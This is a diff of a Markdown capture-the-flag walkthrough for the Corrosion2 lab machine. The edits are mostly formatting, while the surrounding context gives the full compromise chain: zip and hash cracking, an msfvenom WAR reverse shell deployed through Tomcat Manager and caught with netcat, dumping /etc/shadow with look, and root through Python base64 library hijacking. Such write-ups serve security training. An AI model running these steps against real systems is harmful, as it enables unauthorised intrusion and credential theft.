@@ -34,10 +34,10 @@ In this task, we perform a series of steps to compromise the machine and review 
 ## **CTF Walkthrough Step by Step**
 
 ### **Step 1: Loading the target machines in VirtualBox**
-Start the **Kali Linux** VM in **VirtualBox** with a terminal window
+Start the **Kali Linux** VM in **VirtualBox** with a terminal window<br>
 ![virtkali.png](./сorrosion2/virtkali.png)
 
-and the target machine for research, **Corrosion2**
+and the target machine for research, **Corrosion2**<br>
 ![virtсorrosion2.png](./сorrosion2/virtсorrosion2.png)
 
 ---
@@ -51,8 +51,7 @@ sudo netdiscover
 ```
 
 📌 **Result**:
-We obtained the target machine’s IP address — **192.168.6.178**.
-
+We obtained the target machine’s IP address — **192.168.6.178**.<br>
 ![targetip.png](./сorrosion2/targetip.png)
 
 ⚠️ **Note**: The IP addresses of the attacking and target machines may differ depending on your network configuration.
@@ -79,8 +78,7 @@ Next, we’ll examine the **web application** running on **port 8080**.
 ---
 
 ### **Step 4: Investigating web applications on ports 80 and 8080**
-Open the target **IP address** in a browser. You will see the **default page** of the Apache server.
-
+Open the target **IP address** in a browser. You will see the **default page** of the Apache server.<br>
 ![webapache.png](./сorrosion2/webapache.png)
 
 📌 **Result**:
@@ -93,13 +91,11 @@ dirb http://192.168.6.178/ -X .php,.zip
 ```
 
 📌 **Result**:
-No suspicious files were found.
-
+No suspicious files were found.<br>
 ![dirbapache.png](./сorrosion2/dirbapache.png)
 
 Open the target **IP address** on port **8080** in the browser.
-You will see the default **Tomcat** server page.
-
+You will see the default **Tomcat** server page.<br>
 ![webtomcat.png](./сorrosion2/webtomcat.png)
 
 📌 **Result**:
@@ -112,7 +108,7 @@ dirb http://192.168.6.178:8080/ -X .php,.zip
 ```
 
 📌 **Result**:
-In one of the directories, a backup file **backup.zip** was discovered.
+In one of the directories, a backup file **backup.zip** was discovered.<br>
 ![dirbtomcat.png](./сorrosion2/dirbtomcat.png)
 
 ---
@@ -125,7 +121,7 @@ wget http://192.168.6.178:8080/backup.zip
 ```
 
 📌 **Result**:
-Successfully downloaded the backup file **backup.zip**.
+Successfully downloaded the backup file **backup.zip**.<br>
 ![backupwget.png](./сorrosion2/backupwget.png)
 
 Attempt to extract **backup.zip** using `unzip`:
@@ -135,7 +131,7 @@ unzip backup.zip
 ```
 
 📌 **Result**:
-The backup file **backup.zip** is password-protected.
+The backup file **backup.zip** is password-protected.<br>
 ![backuppswd.png](./сorrosion2/backuppswd.png)
 
 The attempt shows the archive is protected by a password.
@@ -146,7 +142,7 @@ sudo apt install fcrackzip
 ```
 
 📌 **Result**:
-The archive password-cracking tool has been installed.
+The archive password-cracking tool has been installed.<br>
 ![installfcrackzip.png](./сorrosion2/installfcrackzip.png)
 
 Go to the **/usr/share/wordlists** directory and list its files:
@@ -157,7 +153,7 @@ ls
 ```
 
 📌 **Result**:
-The directory contains the archive **rockyou.txt.gz** with a word list.
+The directory contains the archive **rockyou.txt.gz** with a word list.<br>
 ![wordlists.png](./сorrosion2/wordlists.png)
 
 Unpack the **rockyou.txt.gz** archive with `gunzip`:
@@ -168,7 +164,7 @@ ls
 ```
 
 📌 **Result**:
-In **/usr/share/wordlists** we now have the text file **rockyou.txt** with a password list.
+In **/usr/share/wordlists** we now have the text file **rockyou.txt** with a password list.<br>
 ![wordkeys.png](./сorrosion2/wordkeys.png)
 
 Try to crack the password for **backup.zip**. We will use the following parameters:
@@ -185,7 +181,7 @@ ls
 ```
 
 📌 **Result**:
-We obtained the password **@administrator_hi5**.
+We obtained the password **@administrator_hi5**.<br>
 ![backupcracked.png](./сorrosion2/backupcracked.png)
 
 Extract **backup.zip** and view its contents:
@@ -195,7 +191,7 @@ unzip backup.zip
 ```
 
 📌 **Result**:
-We obtained the list of files from **backup.zip**.
+We obtained the list of files from **backup.zip**.<br>
 ![backupfiles.png](./сorrosion2/backupfiles.png)
 
 ---
@@ -224,7 +220,7 @@ ip a
 ```
 
 📌 **Result**:
-Our system’s IP address is **192.168.6.147**.
+Our system’s IP address is **192.168.6.147**.<br>
 ![hostip.png](./сorrosion2/hostip.png)
 
 Create a WAR file using **msfvenom**. Parameters:<br>
@@ -240,36 +236,36 @@ ls
 ```
 
 📌 **Result**:
-Reverse shell **revshell.war** created.
+Reverse shell **revshell.war** created.<br>
 ![revshell.png](./сorrosion2/revshell.png)
 
 ---
 
 ### **Step 8: Uploading the reverse shell to the target computer**
 Using the discovered credentials **admin:melehifokivai**, sign in to the Tomcat Manager.
-In the browser, go to port 8080 of the target machine `192.168.6.178`:
+In the browser, go to port 8080 of the target machine `192.168.6.178`:<br>
 ![tomcathome.png](./сorrosion2/tomcathome.png)
 
 Click **manager app**, enter the credentials, and sign in via **sign in**<br>
 - User: **admin**<br>
-- Password: **melehifokivai**<br>
+- Password: **melehifokivai**<br><br>
 ![tomcatcredentials.png](./сorrosion2/tomcatcredentials.png)
 
 📌 **Result**:
-We gained access to the application management panel on the Tomcat web server.
+We gained access to the application management panel on the Tomcat web server.<br>
 ![tomcatmanager.png](./сorrosion2/tomcatmanager.png)
 
-Find the section for uploading new WAR files on the management page. Click **browse**
+Find the section for uploading new WAR files on the management page. Click **browse**<br>
 ![tomcatwarpart.png](./сorrosion2/tomcatwarpart.png)
 
-Upload the previously created **revshell.war**. Select the file `revshell.war` from the home folder.
+Upload the previously created **revshell.war**. Select the file `revshell.war` from the home folder.<br>
 ![tomcatwarupload.png](./сorrosion2/tomcatwarupload.png)
 
-Use the **deploy** button to deploy the reverse shell application on the Tomcat server.
+Use the **deploy** button to deploy the reverse shell application on the Tomcat server.<br>
 ![tomcatwardeploy.png](./сorrosion2/tomcatwardeploy.png)
 
 📌 **Result**:
-Our application **revshell.war** has been deployed on the target Tomcat server and is available at **http://192.168.6.178:8080/revshell**
+Our application **revshell.war** has been deployed on the target Tomcat server and is available at **http://192.168.6.178:8080/revshell**<br>
 ![tomcatrevshellstarted.png](./сorrosion2/tomcatrevshellstarted.png)
 
 ---
@@ -289,14 +285,14 @@ ls
 ```
 
 📌 **Result**:
-Netcat started listening on port 5555 on our system.
+Netcat started listening on port 5555 on our system.<br>
 ![netcatlistening.png](./сorrosion2/netcatlistening.png)
 
-In the browser, navigate to `/revshell/` on the target machine `192.168.6.178` at port 8080
+In the browser, navigate to `/revshell/` on the target machine `192.168.6.178` at port 8080<br>
 ![tomcatrevshellexecuted.png](./сorrosion2/tomcatrevshellexecuted.png)
 
 📌 **Result**:
-In our terminal, we will see a connection from the target machine.
+In our terminal, we will see a connection from the target machine.<br>
 ![netcatrevshellconnect.png](./сorrosion2/netcatrevshellconnect.png)
 
 After the payload starts, we get a shell. Improve the shell environment using Python:
@@ -306,7 +302,8 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
 📌 **Result**:
-We obtained **bash** on the target computer. This allows us to begin exploring the system for confidential files and potential privilege-escalation paths.
+We obtained **bash** on the target computer.
+This allows us to begin exploring the system for confidential files and potential privilege-escalation paths.<br>
 ![netcatrevshellbash.png](./сorrosion2/netcatrevshellbash.png)
 
 Go to the home directories of users **jaye** and **randy**. Run:
@@ -321,7 +318,7 @@ ls
 ```
 
 📌 **Result**:
-In user **randy**’s home folder we found interesting files **user.txt** and **note.txt**.
+In user **randy**’s home folder we found interesting files **user.txt** and **note.txt**.<br>
 ![netcatrandyfiles.png](./сorrosion2/netcatrandyfiles.png)
 
 View the contents of **user.txt** and **note.txt**:
@@ -332,7 +329,7 @@ cat note.txt
 ```
 
 📌 **Result**:
-From **user.txt** we obtained a flag, which together with the message from **note.txt**, gives us hints for further actions.
+From **user.txt** we obtained a flag, which together with the message from **note.txt**, gives us hints for further actions.<br>
 ![netcatrandyflag.png](./сorrosion2/netcatrandyflag.png)
 
 ---
@@ -345,7 +342,7 @@ ssh jaye@192.168.6.178
 ```
 
 📌 **Result**:
-We successfully logged in via SSH.
+We successfully logged in via SSH.<br>
 ![jayesshconnect.png](./сorrosion2/jayesshconnect.png)
 
 After logging in, use Python to obtain a fully interactive shell:
@@ -355,7 +352,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
 📌 **Result**:
-We obtained **bash** on the target computer as user **jaye**.
+We obtained **bash** on the target computer as user **jaye**.<br>
 ![jayebashconnect.png](./сorrosion2/jayebashconnect.png)
 
 Explore **jaye**’s file system:
@@ -368,7 +365,7 @@ ls -al
 ```
 
 📌 **Result**:
-User **jaye** has access to a **look** command, which can be used to read confidential files, notably **/etc/shadow** and **/etc/passwd**.
+User **jaye** has access to a **look** command, which can be used to read confidential files, notably **/etc/shadow** and **/etc/passwd**.<br>
 ![jayelookfound.png](./сorrosion2/jayelookfound.png)
 
 Use **look** to obtain password hashes of all system users. Command-line choices:<br>
@@ -381,7 +378,7 @@ Use **look** to obtain password hashes of all system users. Command-line choices
 ```
 
 📌 **Result**:
-We obtained the hashed passwords of system users.
+We obtained the hashed passwords of system users.<br>
 ![lookusers1.png](./сorrosion2/lookusers1.png)
 ![lookusers2.png](./сorrosion2/lookusers2.png)
 
@@ -395,7 +392,7 @@ When prompted, confirm with `yes` and enter the **kali** user’s password:
 ```
 
 📌 **Result**:
-We saved the **look** command’s output on the Kali machine.
+We saved the **look** command’s output on the Kali machine.<br>
 ![lookuserskeep.png](./сorrosion2/lookuserskeep.png)
 
 Verify the previous operation. Return to the Kali machine. Run `exit` twice and list files:
@@ -407,7 +404,7 @@ ls
 ```
 
 📌 **Result**:
-The file **hashall.txt** is saved in the **kali** user’s home folder.
+The file **hashall.txt** is saved in the **kali** user’s home folder.<br>
 ![kaliuserfiles.png](./сorrosion2/kaliuserfiles.png)
 
 View **hashall.txt**:
@@ -417,7 +414,7 @@ cat hashall.txt
 ```
 
 📌 **Result**:
-We saved the target system users’ hashed passwords.
+We saved the target system users’ hashed passwords.<br>
 ![kaliuserhashall1.png](./сorrosion2/kaliuserhashall1.png)
 ![kaliuserhashall2.png](./сorrosion2/kaliuserhashall2.png)
 
@@ -430,7 +427,7 @@ cat hash.txt
 ```
 
 📌 **Result**:
-The file **hash.txt** contains information about user **randy**.
+The file **hash.txt** contains information about user **randy**.<br>
 ![randyinfoall.png](./сorrosion2/randyinfoall.png)
 
 ---
@@ -444,7 +441,7 @@ john --help
 
 Key options to note:<br>
 - Syntax: `john [OPTIONS] [PASSWORD-FILES]`
-- `--wordlist[=FILE] --stdin` uses wordlist mode, reading words from a file or stdin.
+- `--wordlist[=FILE] --stdin` uses wordlist mode, reading words from a file or stdin.<br>
 ![johncliparameters1.png](./сorrosion2/johncliparameters1.png)
 ![johncliparameters2.png](./сorrosion2/johncliparameters2.png)
 
@@ -455,7 +452,7 @@ ls /usr/share/wordlists
 ```
 
 📌 **Result**:
-The default password list exists at **/usr/share/wordlists/rockyou.txt**.
+The default password list exists at **/usr/share/wordlists/rockyou.txt**.<br>
 ![rockyouwordslist.png](./сorrosion2/rockyouwordslist.png)
 
 Crack the hash by specifying the wordlist with `--wordlist`:
@@ -466,13 +463,13 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
 This operation can take a long time—from several to many hours—depending on your system’s power.
-By pressing any key in the console (except `q` and `Ctrl+C`) you can monitor status.
+By pressing any key in the console (except `q` and `Ctrl+C`) you can monitor status.<br>
 ![johnrandystatus.png](./сorrosion2/johnrandystatus.png)
 
 > ⚠️ **Note**: The “ETA:” line usually indicates the **Estimated Time of Arrival** (time remaining).
 
 📌 **Result**:
-We obtained **randy**’s password: **07051986randy**
+We obtained **randy**’s password: **07051986randy**<br>
 ![johnrandypassword.png](./сorrosion2/johnrandypassword.png)
 
 ---
@@ -485,7 +482,7 @@ ssh randy@192.168.6.178
 ```
 
 📌 **Result**:
-We logged into the target system using **randy**’s password **07051986randy**.
+We logged into the target system using **randy**’s password **07051986randy**.<br>
 ![randysshsignin.png](./сorrosion2/randysshsignin.png)
 
 Confirm that we cannot obtain root via `su`:
@@ -495,7 +492,7 @@ sudo su -
 ```
 
 📌 **Result**:
-User **randy** cannot obtain root via **su**.
+User **randy** cannot obtain root via **su**.<br>
 ![randysusosu.png](./сorrosion2/randysusosu.png)
 
 Check sudo privileges:
@@ -505,7 +502,7 @@ sudo -l
 ```
 
 📌 **Result**:
-The output indicates that user **randy** may run the Python script **randombase64.py** with elevated privileges.
+The output indicates that user **randy** may run the Python script **randombase64.py** with elevated privileges.<br>
 ![randyprivileges.png](./сorrosion2/randyprivileges.png)
 
 Examine **/home/randy/randombase64.py**:
@@ -516,7 +513,9 @@ cat randombase64.py
 ```
 
 📌 **Result**:
-The script **randombase64.py** imports a module named `base64`. This suggests a potential **Python library hijacking** opportunity. We can modify `base64.py` to execute arbitrary commands with root privileges.
+The script **randombase64.py** imports a module named `base64`.
+This suggests a potential **Python library hijacking** opportunity.
+We can modify `base64.py` to execute arbitrary commands with root privileges.<br>
 ![randyrandombase64.png](./сorrosion2/randyrandombase64.png)
 
 To get the path to **base64.py** use `locate`:
@@ -526,7 +525,7 @@ locate base64.py
 ```
 
 📌 **Result**:
-The full path **/usr/lib/python3.8/base64.py** was found.
+The full path **/usr/lib/python3.8/base64.py** was found.<br>
 ![pythonlocatebase64.png](./сorrosion2/pythonlocatebase64.png)
 
 Check permissions on **/usr/lib/python3.8/base64.py**:
@@ -536,7 +535,8 @@ ls -al /usr/lib/python3.8/base64.py
 ```
 
 📌 **Result**:
-Access to **/usr/lib/python3.8/base64.py** is owned by user and group **root**. Therefore, a process that runs **base64.py** (when executed with sudo) will have **root** rights.
+Access to **/usr/lib/python3.8/base64.py** is owned by user and group **root**.
+Therefore, a process that runs **base64.py** (when executed with sudo) will have **root** rights.<br>
 ![pythonlsbase64.png](./сorrosion2/pythonlsbase64.png)
 
 Open **/usr/lib/python3.8/base64.py** for editing:
@@ -546,7 +546,7 @@ nano /usr/lib/python3.8/base64.py
 ```
 
 📌 **Result**:
-The file **/usr/lib/python3.8/base64.py** is available for editing.
+The file **/usr/lib/python3.8/base64.py** is available for editing.<br>
 ![nanocmdbase64.png](./сorrosion2/nanocmdbase64.png)
 ![nanoeditbase64.png](./сorrosion2/nanoeditbase64.png)
 
@@ -557,7 +557,7 @@ import os
 os.system("/bin/bash")
 ```
 
-Save the changes with **Ctrl+O** and **Ctrl+X**.
+Save the changes with **Ctrl+O** and **Ctrl+X**.<br>
 ![nanoinsertimport.png](./сorrosion2/nanoinsertimport.png)
 
 Verify the changes by printing the first 16 lines of **/usr/lib/python3.8/base64.py**:
@@ -567,20 +567,22 @@ head -n 16 /usr/lib/python3.8/base64.py
 ```
 
 📌 **Result**:
-We modified the **base64.py** module and can now escalate privileges.
+We modified the **base64.py** module and can now escalate privileges.<br>
 ![headinsertimport.png](./сorrosion2/headinsertimport.png)
 
-Use `sudo` to run **/home/randy/randombase64.py**. This script will import the modified **/usr/lib/python3.8/base64.py** and spawn a **root shell** for us. Use the password **07051986randy** when prompted:
+Use `sudo` to run **/home/randy/randombase64.py**.
+This script will import the modified **/usr/lib/python3.8/base64.py** and spawn a **root shell** for us.
+Use the password **07051986randy** when prompted:
 
 ```sh
 sudo /usr/bin/python3.8 /home/randy/randombase64.py
 ```
 
 📌 **Result**:
-Using the **base64.py** module we obtained **root access** to the target system.
+Using the **base64.py** module we obtained **root access** to the target system.<br>
 ![pythonrandombase64.png](./сorrosion2/pythonrandombase64.png)
 
-> ⚠️ **Note**: You must specify full paths to the files. Otherwise, you might not obtain **root** privileges.
+> ⚠️ **Note**: You must specify full paths to the files. Otherwise, you might not obtain **root** privileges.<br>
 ![pythonfilebase64.png](./сorrosion2/pythonfilebase64.png)
 
 Having obtained full system access, go to the **root** user’s home directory and display the **root.txt** flag:
@@ -594,7 +596,7 @@ pwd
 ```
 
 📌 **Result**:
-We obtained full access to the target system and can perform any actions. The **root.txt** file was found.
+We obtained full access to the target system and can perform any actions. The **root.txt** file was found.<br>
 ![rootaccessdone.png](./сorrosion2/rootaccessdone.png)
 
 ✅ **Final flag obtained! CTF completed!** 🎯
